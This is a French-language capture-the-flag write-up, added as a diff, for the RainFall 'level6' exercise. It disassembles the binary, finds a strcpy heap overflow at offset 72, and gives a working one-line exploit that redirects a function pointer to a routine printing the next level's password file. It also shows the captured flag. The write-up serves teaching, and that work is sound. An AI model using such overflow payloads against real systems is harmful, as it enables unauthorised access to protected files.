@@ -1,0 +1,51 @@
+#LEVEL 6
+
+On lance le binaire sans arguments il segfault, on le relance avec un argument
+il nous print "Nope".
+
+level6@RainFall:~$ objdump -d level6
+
+08048454 <n>:
+ 8048454:	55                   	push   %ebp
+ 8048455:	89 e5                	mov    %esp,%ebp
+ 8048457:	83 ec 18             	sub    $0x18,%esp
+ 804845a:	c7 04 24 b0 85 04 08 	movl   $0x80485b0,(%esp)
+ 8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>
+ 8048466:	c9                   	leave
+ 8048467:	c3                   	ret
+
+La fonction <n> ici presente n'est pas appelee par notre programme, on peut
+le verifier lorsque l'on gdb celui-ci.
+
+(gdb) x/s 0x80485b0
+0x80485b0:	 "/bin/cat /home/user/level7/.pass"
+
+Et celle-ci effectue un cat sur le fichier dont nous cherchons le contenu..
+
+   0x080484d0 <+84>:	call   *%eax
+
+Cette ligne nous interesse, un call est effectue sur la fonction <m> qui elle
+nous affiche le fameux "Nope".
+
+   0x0804846e <+6>:	movl   $0x80485d1,(%esp)
+   0x08048475 <+13>:	call   0x8048360 <puts@plt>
+
+	(gdb) x 0x80485d1
+	0x80485d1:	 "Nope"
+
+Nous allons utilise la faille presente dans le programe level6, qui ne fais
+aucune verification concernant la taille des donnees recu par malloc avant
+l'appel a strcpy, ce qui va nous permettre le buffer overflow et l'appel a la
+fonction <n> plutot que l'appel a la fonction <m>
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+Nous recuperons l'offset qui est de 72, nous n'avons plus qu'a modifier
+l'adresse contenu dans eax, par celle de la fonction <n> pour pouvoir recuperer
+le flag.
+
+level6@RainFall:~$ ./level6 $(python -c 'print 72*"A"+"\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+Gogogogo Power Rangers..
+
